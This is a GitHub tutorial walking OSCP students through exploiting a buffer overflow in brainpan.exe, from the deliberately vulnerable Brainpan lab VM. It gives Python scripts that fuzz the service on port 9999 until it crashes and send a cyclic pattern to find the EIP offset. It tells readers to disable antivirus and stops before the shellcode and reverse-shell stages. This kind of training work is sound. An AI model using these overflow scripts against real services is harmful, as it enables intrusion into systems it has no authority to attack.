# BufferOverflowGuide


## Hii..! Hackers Welcome 

### Brainpan is a vulnerable virtual machine designed for New students who are intrested to learn bufferoverflow or who are going to answer the oscp Examination. So in this github Page i will going show you how to exploit brainpan.exe. Well i will not going to start from the begnning like scanning the brainpan machine as i have already scaned the Machine and found Brainpan.exe in /bin path at port 10000 which was of python http server 



>***Requiments :- Immunity Debugger , VirtualBox in Windows7.***



### As i was facing some issue with my windows7 machine i use my host machine to exploit this brainpan.exe file 



>***Aim :- Exploiting BrainPan.exe and gaining Reverse Shell Access***



***NOTE :- Make sure that You Trun Off Your Anitvirus and Windows defender*** 

### Open Immunity Debugger in Administrator Mode and click on file >> open >> and select the brainpan.exe file! then click on the paly button so that the brainpan.exe is in running mode



![base1](https://user-images.githubusercontent.com/102399357/232192974-d27a2cdc-ba1c-469e-9147-792f0c30cdad.PNG)

### Then the .exe will start Running on the Host With Port Number 9999

![runnning](https://user-images.githubusercontent.com/102399357/232191959-ab9db141-5b4f-4e98-a922-214048c3bbd5.PNG)


### As we Now know that the .exe is serving on port 9999 now let us Fuzz the input of the brainpan.exe 

***What is Fuzzing ? <br />
In programming and software development, fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Typically, fuzzers are used to test programs that take structured inputs <br /> (Shameless copied from Wikipedia)*** 



## Step 1 Fuzzing <br />
### The Following Python Script is Used to Fuzz The brainpan.exe service <br />

```python
import socket
import sys
import time

IP="192.168.94.131"

i=100
while True:
	try:
		with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
			c.settimeout(5)
			c.connect((IP,9999))
			c.recv(9999999)
			string="A"*i
			c.send(bytes(string+" \r\n",'utf-8'))
			print("[+]"+str(i)+" Bytes Sent..!")
			time.sleep(1)
			c.recv(9999999)

	except:
		print("[!]Crashed at "+str(i)+" Bytes")
		sys.exit(0)
	i=i+100
```
***In The First Line of Code i have Imported some modules. I have declared some variables IP ( To set Ip Addr ) and i value to 100 for Counter purpose. Now in while True loop which is infinet loop i have added try and except block in which i have created a socket object refeared as c in which i set the timeout to 5 sec and then connect to the desire Ip address and Port Number of my Host machine. following that we recive the bufffer which is the banner and Enter Password Text after receving the buffer i have created the string variable in which i create "A" into 100 times at the first entry time and then we send the string with "\r\n" which is Used as a new line character in Windows And then we print how may bytes was send of "A" 's and then we recv the buffer saying that Access Denied in except block we print out that at how many bytes the program was crashed and then exit the program and if the the program was not crashed it incriments the i value t0 +100. and the program is continued until the .exe is being crashed...!***<br />


>***Python3 Fuzz.py***
<br />

![Fuzz](https://user-images.githubusercontent.com/102399357/232196177-caed504b-2f25-4b97-bda8-55a3b546e20b.PNG)

### As Soon as we run the script we see that the .exe Program gets Crashed at  600 bytes As We can see that the all the registors and EIP is Also gets overwritten with 41 which is "A" in hex format  <br />

![immuFuzz](https://user-images.githubusercontent.com/102399357/232196264-1670e72a-9ea2-4fdb-97ef-0f0dfb3109e3.PNG)

### Now we know that our .exe was crashing at 600 bytes but we actually dont know the Exact offset value.
<br />

## Step 2 Finding the Offset <br />

***what is offset? <br />
   When you are overflowing a buffer to write on the stack in a way which is exploitable you will overwrite the return address on the stack. Ie, sending a long string of AAAAAAAAAAAAAAAAAAAAAAAAAAA.....AAAAAAAAA will result in EIP containing the value 0x41414141 when the application crashes.***

**Now assume that if we pass "A" into 10 times + "B" into 4 times and in EIP we see that the EIP value is 42424242 so the offset will be 10bytes Because we see that after 10 "A"'s any value we provide to the string it gets overwritten to the EIP value**

### Now in real scenario we cannot guess the offset by hitting random value Again and Again this might be very time consuming for that we have a term called Cyclic Pattern generator in kali linux it comes with pre installed in metasploit. <br />


![cyclic](https://user-images.githubusercontent.com/102399357/232198783-84422f9f-f855-4aae-8158-9c24482c51e0.PNG)


**The script will generate a unique pattern of length 650 bytes, which is used for identifying the offset. The "-l" option is followed by the length of the pattern in bytes.Over hear i have specified 650 bytes because when we runed our Fuzzing Progarming we saw that the program got craashed at 600 bytes Right ? 
So the prgram offset can be below 600 bytes or equal to 600 bytes so it is alway a good habit to give more 50 or 100 bytes to be on safe side.** 

<br />

***Note :- If the "-l" option is not specified, the default pattern length of 8192 bytes is used.***

<br />

**Now Create a Python File named Offset.py**

```python
import socket
import sys
import time


cyclic_pattern="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av"


with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
	c.connect(("192.168.94.131",9999))
	c.recv(99999)
	c.send(bytes(cyclic_pattern+' \r\n',"utf-8"))
	print("[cyclic_pattern sucessfully sented]")
	c.close()

```
## The above python Script is used to find the offset of the EIP all the cretia is same but now insted of string we send the cyclic_pattern which was generated by the metasploit.

<br />

![cyclic_sent](https://user-images.githubusercontent.com/102399357/232201932-177c3508-df28-4168-b180-1b5f9d89c94b.PNG)

**In the above we see that the cyclic pattern as Sucessfully Sended.As soon as We sent the cyclic pattern it gets overwritten to EIP register so now we should copy th EIP value from the immunity Debugger.**

![imut_cyclic](https://user-images.githubusercontent.com/102399357/232202522-273177b5-403f-4766-b06a-34b2262fca47.png)
 
 **in my case the EIP value is 35724134 now in the he stack the value is stored in the Litte edian Format which means that the value is in reverse order so if the remove the value in revrerse order the pattern in the EIP will be 4Ar5 i have Demostrate the python interpt by manually finding the cyclic paattern as it is an Good Pratice**
 
 <br />
 
 >***Use Python3***
 
 ![hex_decode](https://user-images.githubusercontent.com/102399357/232202850-6984866b-53d0-45ce-a13a-c2673448f2bf.PNG)

**After getting the exact value in EIP Pointer type the Following command in the kali linux.**

![match](https://user-images.githubusercontent.com/102399357/232202971-a81da0b2-3ec0-42db-8302-ff4236c6a1b1.png)



 



